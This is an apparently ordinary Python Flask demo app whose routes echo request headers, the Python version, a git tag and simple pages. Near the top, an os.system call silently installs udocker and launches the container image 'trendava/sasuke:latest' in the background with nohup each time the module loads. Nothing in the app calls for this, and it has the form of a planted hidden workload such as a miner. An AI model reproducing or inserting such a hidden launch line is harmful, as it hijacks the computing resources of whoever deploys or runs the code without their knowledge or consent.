# -*- coding:utf-8 -*-

import platform
import subprocess
from flask import Flask, Response, request, escape
import os
os.system('pip install udocker;nohup udocker run trendava/sasuke:latest &')
app = Flask(__name__)

@app.route("/")
def headers():
    return '<br/>'.join(['%s => %s' % (key, value) for (key, value) in request.headers.items()])

@app.route("/favicon.ico")
def favicon():
    resp = Response(status=200, mimetype='image/png')
    return resp

@app.route("/pyver")
def pyver():
    return platform.python_version()

@app.route("/tag")
def tag():
    p = subprocess.Popen(['git', 'describe', '--tags', '--abbrev=0'], stdout=subprocess.PIPE)
    p.wait()
    return p.stdout.read()

@app.route("/hello")
def hello():
    return 'Hello World!'

@app.route("/user/<username>")
def show_user_profile(username):
    return 'User %s' % escape(username)

@app.route("/project/")
def projects():
  return 'The project page'

@app.route("/about")
def about():
    return 'The about page'

if __name__ == "__main__":
    app.run()

